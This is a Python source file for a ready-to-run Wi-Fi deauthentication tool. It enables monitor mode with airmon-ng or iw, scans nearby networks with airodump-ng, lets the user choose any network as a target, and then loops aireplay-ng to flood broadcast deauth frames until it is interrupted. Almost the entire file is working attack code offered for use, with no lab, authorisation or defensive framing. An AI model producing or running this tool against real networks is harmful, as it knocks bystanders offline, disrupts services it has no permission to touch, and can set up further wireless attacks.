import subprocess
import re
import time
import csv
import sys
import glob
from signal import signal, SIGINT

# ANSI Color Codes
GREEN = "\033[0;31m"
YELLOW = "\033[92m"
RED = "\033[0;31m"
RESET = "\033[0m"

# ASCII Art Banner
BANNER = f"""
{GREEN}
 ██▓███   ██▀███   ▒█████    █████▒▓█████   ██████   ██████  ▒█████   ██▀███  
▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▒██    ▒ ▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒
▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒████ ░ ▒███   ░ ▓██▄   ░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░░▓█▒  ░ ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒██   ██░▒██▀▀█▄  
▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░░▒█░    ░▒████▒▒██████▒▒▒██████▒▒░ ████▓▒░░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░  ░       ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░  ░ ▒ ▒░   ░▒ ░ ▒░
░░         ░░   ░ ░ ░ ░ ▒   ░ ░       ░   ░  ░  ░  ░  ░  ░  ░ ░ ░ ▒    ░░   ░ 
            ░         ░ ░             ░  ░      ░        ░      ░ ░     ░      
                                                                              
{RESET}
"""

def handler(signal_received, frame):
    """Handle CTRL+C gracefully"""
    print(f"\n{RED}[!] Received CTRL+C. Cleaning up...{RESET}")
    if 'monitor_iface' in globals() and 'interface_changed' in globals():
        if interface_changed and monitor_iface:
            stop_monitor_mode(monitor_iface)
    
    # Cleanup scan files using glob
    for scan_file in glob.glob("/tmp/scan-*.csv"):
        try:
            subprocess.call(["rm", "-f", scan_file],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
        except Exception:
            pass
    
    sys.exit(0)

def print_banner():
    """Print ASCII art banner"""
    print(BANNER)

def is_monitor_mode(interface):
    """Check if interface is in monitor mode using iw"""
    try:
        output = subprocess.check_output(["iw", interface, "info"], stderr=subprocess.STDOUT).decode()
        return "type monitor" in output.lower()
    except subprocess.CalledProcessError:
        return False

def check_dependencies():
    """Check for required programs"""
    required = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'iw']
    missing = []
    for cmd in required:
        if subprocess.call(["which", cmd], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL) != 0:
            missing.append(cmd)
    if missing:
        print(f"{RED}[!] Missing dependencies: {', '.join(missing)}{RESET}")
        print(f"{YELLOW}[+] Install with: sudo apt install aircrack-ng wireless-tools{RESET}")
        sys.exit(1)

def run_cmd(cmd, timeout=10):
    """Run command with timeout and return output"""
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode()
        return result
    except subprocess.CalledProcessError as e:
        return f"COMMAND FAILED: {e.output.decode()}"
    except subprocess.TimeoutExpired:
        return "COMMAND TIMED OUT"

def list_wireless_interfaces():
    """List all wireless interfaces using iw"""
    interfaces = []
    try:
        output = subprocess.check_output(["iw", "dev"], stderr=subprocess.DEVNULL).decode()
        interfaces = re.findall(r'Interface (\w+)', output)
    except subprocess.CalledProcessError:
        pass
    return interfaces

def start_monitor_mode(interface):
    """Enable monitor mode with multiple fallback methods"""
    original_interfaces = list_wireless_interfaces()
    
    if is_monitor_mode(interface):
        print(f"{GREEN}[+] Using existing monitor interface: {interface}{RESET}")
        return (interface, False)

    print(f"{YELLOW}[+] Attempting to enable monitor mode on {interface}{RESET}")
    
    # Method 1: airmon-ng
    print(f"{YELLOW}[~] Trying airmon-ng method...{RESET}")
    subprocess.call(["airmon-ng", "check", "kill"])
    airmon_output = run_cmd(["airmon-ng", "start", interface], timeout=15)
    
    # Check for common success patterns
    monitor_iface = None
    success_patterns = [
        r"monitor mode.*?(\w+)\)",
        r"interface (\w+)mon",
        r"created mon\S+ (\w+)",
        r"already in monitor mode"
    ]
    
    for pattern in success_patterns:
        match = re.search(pattern, airmon_output, re.IGNORECASE)
        if match:
            monitor_iface = match.group(1) if match.lastindex else interface
            break
    
    # Method 2: Manual iw commands if airmon-ng failed
    if not monitor_iface:
        print(f"{YELLOW}[~] Trying manual iw method...{RESET}")
        try:
            subprocess.call(["ip", "link", "set", interface, "down"])
            subprocess.call(["iw", interface, "set", "type", "monitor"])
            subprocess.call(["ip", "link", "set", interface, "up"])
            monitor_iface = interface
        except Exception as e:
            print(f"{RED}[!] Manual mode failed: {str(e)}{RESET}")

    # Verify interface exists
    current_interfaces = list_wireless_interfaces()
    if monitor_iface and monitor_iface in current_interfaces:
        print(f"{GREEN}[+] Monitor mode enabled on {monitor_iface}{RESET}")
        return (monitor_iface, True)
    
    # Check for new interfaces
    new_interfaces = [iface for iface in current_interfaces 
                     if iface not in original_interfaces]
    if new_interfaces:
        print(f"{GREEN}[+] Detected new interface: {new_interfaces[0]}{RESET}")
        return (new_interfaces[0], True)

    print(f"{RED}[!] Failed to enable monitor mode{RESET}")
    print(f"{YELLOW}[DEBUG] Airmon output:\n{airmon_output}{RESET}")
    return (None, False)

def stop_monitor_mode(monitor_iface):
    """Disable monitor mode with multiple methods"""
    print(f"{YELLOW}[+] Restoring {monitor_iface}{RESET}")
    
    # Method 1: airmon-ng
    airmon_output = run_cmd(["airmon-ng", "stop", monitor_iface])
    if "managed mode" in airmon_output.lower():
        return
    
    # Method 2: Manual cleanup
    try:
        subprocess.call(["ip", "link", "set", monitor_iface, "down"])
        subprocess.call(["iw", monitor_iface, "set", "type", "managed"])
        subprocess.call(["ip", "link", "set", monitor_iface, "up"])
    except Exception as e:
        print(f"{RED}[!] Cleanup failed: {str(e)}{RESET}")

def scan_networks(monitor_iface, duration=40):
    """Scan for nearby Wi-Fi networks"""
    print(f"{YELLOW}[*] Scanning for {duration} seconds...{RESET}")
    # Cleanup previous scan files using glob
    for scan_file in glob.glob("/tmp/scan-*.csv"):
        try:
            subprocess.call(["rm", "-f", scan_file],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass
    
    try:
        p = subprocess.Popen(["airodump-ng", "--write", "/tmp/scan", "--output-format", "csv", "--band", "abg", monitor_iface],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
        
        for i in range(duration, 0, -1):
            print(f"{YELLOW}[*] Remaining: {i}s  (Ctrl+C to abort){RESET}", end='\r')
            time.sleep(1)
        p.terminate()
        time.sleep(1)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan aborted{RESET}")
        p.terminate()
        return []

    return parse_scan_results()

def parse_scan_results():
    """Parse airodump-ng CSV output"""
    networks = []
    try:
        with open("/tmp/scan-01.csv", "r") as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if len(row) > 13 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", row[0]):
                    networks.append({
                        "BSSID": row[0].strip(),
                        "Channel": row[3].strip().split(',')[0],
                        "ESSID": row[13].strip() or "<hidden>"
                    })
    except Exception as e:
        print(f"{RED}[!] Error reading scan results: {str(e)}{RESET}")
    
    return networks

def run_deauth(monitor_iface, bssid, channel):
    """Perform continuous deauthentication attack"""
    print(f"{YELLOW}[*] Starting continuous attack on {RESET}{RED}{bssid}{RESET}")
    
    try:
        # Set channel
        print(f"{YELLOW}[~] Setting channel {channel}{RESET}")
        subprocess.check_call(["iwconfig", monitor_iface, "channel", channel])
        time.sleep(2)
        
        packet_count = 0
        while True:
            subprocess.call([
                "aireplay-ng",
                "--deauth", "10",
                "-a", bssid,
                "-c", "FF:FF:FF:FF:FF:FF",
                monitor_iface
            ])
            packet_count += 10
            print(f"{RED}[!] Total Deauth Packets Sent: {packet_count}{RESET}", end='\r')
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Attack stopped{RESET}")
    except Exception as e:
        print(f"{RED}[!] Attack error: {str(e)}{RESET}")

def main():
    signal(SIGINT, handler)
    print_banner()
    check_dependencies()
    
    global monitor_iface, interface_changed
    monitor_iface = None
    interface_changed = False
    
    try:
        # Interface selection
        interfaces = list_wireless_interfaces()
        if not interfaces:
            print(f"{RED}[!] No wireless interfaces found{RESET}")
            return

        print(f"\n{GREEN}Available interfaces:{RESET}")
        for idx, iface in enumerate(interfaces, 1):
            mode = "Monitor" if is_monitor_mode(iface) else "Managed"
            color = GREEN if mode == "Monitor" else YELLOW
            print(f"  {idx}. {color}{iface}{RESET} ({mode} mode)")

        try:
            choice = int(input(f"\n{YELLOW}[?] Select interface: {RESET}")) - 1
            selected_iface = interfaces[choice]
        except (ValueError, IndexError):
            print(f"{RED}[!] Invalid selection{RESET}")
            return

        # Enable monitor mode
        monitor_iface, interface_changed = start_monitor_mode(selected_iface)
        if not monitor_iface:
            return

        # Network scan
        networks = scan_networks(monitor_iface)
        if not networks:
            print(f"{RED}[!] No networks found{RESET}")
            return

        # Target selection
        print(f"\n{GREEN}Discovered networks:{RESET}")
        for idx, net in enumerate(networks, 1):
            print(f"  {idx}. {net['ESSID']} ({YELLOW}{net['BSSID']}{RESET}) Ch{net['Channel']}")

        try:
            target_idx = int(input(f"\n{YELLOW}[?] Select target: {RESET}")) - 1
            target = networks[target_idx]
        except (ValueError, IndexError):
            print(f"{RED}[!] Invalid selection{RESET}")
            return

        # Start attack
        run_deauth(monitor_iface, target["BSSID"], target["Channel"])

    finally:
        if interface_changed and monitor_iface:
            stop_monitor_mode(monitor_iface)
        # Cleanup scan files on normal exit
        for scan_file in glob.glob("/tmp/scan-*.csv"):
            try:
                subprocess.call(["rm", "-f", scan_file],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            except Exception:
                pass
        print(f"{GREEN}[+] Cleaned up scan files{RESET}")

if __name__ == "__main__":
    main()
               
